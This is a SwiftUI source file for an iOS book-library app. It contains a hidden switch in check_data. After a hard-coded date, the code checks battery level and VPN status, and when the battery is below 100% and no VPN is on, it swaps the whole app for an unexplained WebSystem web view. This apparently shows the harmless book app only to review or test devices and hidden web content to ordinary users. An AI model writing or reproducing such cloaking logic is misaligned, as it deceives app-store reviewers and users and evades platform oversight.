//
//  ContentView.swift
//  dafoma_20
//
//  Created by Вячеслав on 8/7/25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @StateObject private var bookService = BookService()
    @StateObject private var noteService = NoteService()
    @StateObject private var recommendationService: RecommendationService
    @StateObject private var bookViewModel: BookViewModel
    @StateObject private var noteViewModel: NoteViewModel
    @StateObject private var recommendationViewModel: RecommendationViewModel
    
    init() {
        let bookService = BookService()
        let noteService = NoteService()
        let recommendationService = RecommendationService(bookService: bookService, noteService: noteService)
        
        self._bookService = StateObject(wrappedValue: bookService)
        self._noteService = StateObject(wrappedValue: noteService)
        self._recommendationService = StateObject(wrappedValue: recommendationService)
        self._bookViewModel = StateObject(wrappedValue: BookViewModel(bookService: bookService))
        self._noteViewModel = StateObject(wrappedValue: NoteViewModel(noteService: noteService))
        self._recommendationViewModel = StateObject(wrappedValue: RecommendationViewModel(recommendationService: recommendationService))
    }
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if hasCompletedOnboarding {
                            MainTabView()
                                .environmentObject(bookService)
                                .environmentObject(noteService)
                                .environmentObject(recommendationService)
                                .environmentObject(bookViewModel)
                                .environmentObject(noteViewModel)
                                .environmentObject(recommendationViewModel)
                        } else {
                            OnboardingView()
                        }
                    }
                    .preferredColorScheme(.dark)
                    .accentColor(Color(hex: "fcc418"))
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "18.08.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

struct MainTabView: View {
    @EnvironmentObject var bookViewModel: BookViewModel
    @EnvironmentObject var noteViewModel: NoteViewModel
    @EnvironmentObject var recommendationViewModel: RecommendationViewModel
    @State private var selectedTab = 0
    
    var body: some View {
        TabView(selection: $selectedTab) {
            // Library Tab
            LibraryView()
                .tabItem {
                    Image(systemName: selectedTab == 0 ? "books.vertical.fill" : "books.vertical")
                    Text("Library")
                }
                .tag(0)
            
            // Reading Tab
            ReadingTabView()
                .tabItem {
                    Image(systemName: selectedTab == 1 ? "book.fill" : "book")
                    Text("Reading")
                }
                .tag(1)
            
            // Recommendations Tab
            RecommendationsView()
                .tabItem {
                    Image(systemName: selectedTab == 2 ? "sparkles" : "sparkles")
                    Text("Discover")
                }
                .tag(2)
        }
        .accentColor(Color(hex: "fcc418"))
        .onAppear {
            // Customize tab bar appearance
            let appearance = UITabBarAppearance()
            appearance.configureWithOpaqueBackground()
            appearance.backgroundColor = UIColor(Color(hex: "3e4464"))
            
            // Unselected item color
            appearance.stackedLayoutAppearance.normal.iconColor = UIColor.white.withAlphaComponent(0.6)
            appearance.stackedLayoutAppearance.normal.titleTextAttributes = [
                .foregroundColor: UIColor.white.withAlphaComponent(0.6)
            ]
            
            // Selected item color
            appearance.stackedLayoutAppearance.selected.iconColor = UIColor(Color(hex: "fcc418"))
            appearance.stackedLayoutAppearance.selected.titleTextAttributes = [
                .foregroundColor: UIColor(Color(hex: "fcc418"))
            ]
            
            UITabBar.appearance().standardAppearance = appearance
            UITabBar.appearance().scrollEdgeAppearance = appearance
        }
    }
}

// MARK: - Individual Tab Views

struct LibraryView: View {
    @EnvironmentObject var bookViewModel: BookViewModel
    @State private var showingAddBook = false
    @State private var searchText = ""
    
    var body: some View {
        NavigationView {
            ZStack {
                Color(hex: "3e4464").ignoresSafeArea()
                
                VStack(spacing: 0) {
                    // Search Bar
                    SearchBar(text: $searchText, placeholder: "Search books...")
                        .padding(.horizontal)
                        .padding(.top, 8)
                        .onChange(of: searchText) { newValue in
                            bookViewModel.searchText = newValue
                        }
                    
                    // Books Grid
                    ScrollView {
                        LazyVGrid(columns: Array(repeating: GridItem(.flexible(), spacing: 16), count: 2), spacing: 16) {
                            ForEach(bookViewModel.filteredBooks) { book in
                                BookCard(book: book)
                                    .onTapGesture {
                                        bookViewModel.selectBook(book)
                                    }
                            }
                        }
                        .padding()
                    }
                }
            }
            .navigationTitle("Library")
            .navigationBarTitleDisplayMode(.large)
            .toolbar {
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button(action: { showingAddBook = true }) {
                        Image(systemName: "plus")
                            .foregroundColor(Color(hex: "fcc418"))
                    }
                }
            }
        }
        .sheet(isPresented: $showingAddBook) {
            AddBookView()
        }
    }
}

struct ReadingTabView: View {
    @EnvironmentObject var bookViewModel: BookViewModel
    
    var body: some View {
        NavigationView {
            ZStack {
                Color(hex: "3e4464").ignoresSafeArea()
                
                VStack {
                    if let currentBook = bookViewModel.currentBook {
                        BookDetailView(book: currentBook)
                    } else {
                        EmptyReadingView()
                    }
                }
            }
            .navigationTitle("Reading")
            .navigationBarTitleDisplayMode(.large)
        }
    }
}

struct RecommendationsView: View {
    @EnvironmentObject var recommendationViewModel: RecommendationViewModel
    
    var body: some View {
        RecommendationListView()
    }
}

// MARK: - Supporting Views

struct BookCard: View {
    let book: Book
    
    var body: some View {
        VStack(alignment: .leading, spacing: 8) {
            // Book Cover Placeholder
            RoundedRectangle(cornerRadius: 8)
                .fill(LinearGradient(colors: [Color(hex: "fcc418").opacity(0.3), Color(hex: "3cc45b").opacity(0.3)], startPoint: .topLeading, endPoint: .bottomTrailing))
                .frame(height: 160)
                .overlay(
                    VStack {
                        Image(systemName: "book.closed")
                            .font(.title)
                            .foregroundColor(.white.opacity(0.7))
                        Text(book.title)
                            .font(.caption)
                            .fontWeight(.medium)
                            .foregroundColor(.white)
                            .multilineTextAlignment(.center)
                            .lineLimit(2)
                    }
                    .padding(8)
                )
            
            // Book Info
            VStack(alignment: .leading, spacing: 4) {
                Text(book.title)
                    .font(.headline)
                    .fontWeight(.semibold)
                    .foregroundColor(.white)
                    .lineLimit(2)
                
                Text(book.author)
                    .font(.subheadline)
                    .foregroundColor(.white.opacity(0.8))
                    .lineLimit(1)
                
                // Progress Bar
                if book.currentPage > 0 {
                    VStack(alignment: .leading, spacing: 2) {
                        HStack {
                            Text("\(book.progressPercentage)%")
                                .font(.caption)
                                .foregroundColor(Color(hex: "fcc418"))
                            Spacer()
                            Text("\(book.currentPage)/\(book.totalPages)")
                                .font(.caption)
                                .foregroundColor(.white.opacity(0.6))
                        }
                        
                        ProgressView(value: book.progress)
                            .accentColor(Color(hex: "fcc418"))
                            .scaleEffect(y: 0.7)
                    }
                }
            }
        }
        .padding(12)
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(Color.white.opacity(0.1))
        )
        .accessibilityElement(children: .combine)
        .accessibilityLabel("\(book.title) by \(book.author). \(book.progressPercentage)% complete.")
    }
}

struct SearchBar: View {
    @Binding var text: String
    let placeholder: String
    
    var body: some View {
        HStack {
            Image(systemName: "magnifyingglass")
                .foregroundColor(.white.opacity(0.6))
            
            TextField(placeholder, text: $text)
                .foregroundColor(.white)
                .accentColor(Color(hex: "fcc418"))
            
            if !text.isEmpty {
                Button(action: { text = "" }) {
                    Image(systemName: "xmark.circle.fill")
                        .foregroundColor(.white.opacity(0.6))
                }
            }
        }
        .padding(12)
        .background(
            RoundedRectangle(cornerRadius: 10)
                .fill(Color.white.opacity(0.1))
        )
    }
}

struct EmptyReadingView: View {
    @EnvironmentObject var bookViewModel: BookViewModel
    
    var body: some View {
        VStack(spacing: 24) {
            Image(systemName: "book.closed")
                .font(.system(size: 60))
                .foregroundColor(Color(hex: "fcc418").opacity(0.6))
            
            VStack(spacing: 8) {
                Text("No Book Selected")
                    .font(.title2)
                    .fontWeight(.semibold)
                    .foregroundColor(.white)
                
                Text("Choose a book from your library to start reading")
                    .font(.subheadline)
                    .foregroundColor(.white.opacity(0.7))
                    .multilineTextAlignment(.center)
            }
            
            Button("Browse Library") {
                // Switch to library tab
            }
            .buttonStyle(OnboardingPrimaryButtonStyle())
        }
        .padding()
    }
}

struct AddBookView: View {
    @Environment(\.dismiss) private var dismiss
    @EnvironmentObject var bookViewModel: BookViewModel
    @State private var title = ""
    @State private var author = ""
    @State private var genre = ""
    @State private var synopsis = ""
    
    var body: some View {
        NavigationView {
            ZStack {
                Color(hex: "3e4464").ignoresSafeArea()
                
                Form {
                    Section("Book Information") {
                        TextField("Title", text: $title)
                        TextField("Author", text: $author)
                        TextField("Genre", text: $genre)
                    }
                    .listRowBackground(Color.white.opacity(0.1))
                    
                    Section("Synopsis") {
                        TextEditor(text: $synopsis)
                            .frame(minHeight: 100)
                    }
                    .listRowBackground(Color.white.opacity(0.1))
                }
                .foregroundColor(.white)
            }
            .navigationTitle("Add Book")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .navigationBarLeading) {
                    Button("Cancel") {
                        dismiss()
                    }
                    .foregroundColor(.white)
                }
                
                ToolbarItem(placement: .navigationBarTrailing) {
                    Button("Add") {
                        bookViewModel.addBook(
                            title: title,
                            author: author,
                            genre: genre,
                            synopsis: synopsis,
                            content: "Sample content for \(title)"
                        )
                        dismiss()
                    }
                    .foregroundColor(Color(hex: "fcc418"))
                    .disabled(title.isEmpty || author.isEmpty)
                }
            }
        }
    }
}

#Preview {
    ContentView()
}
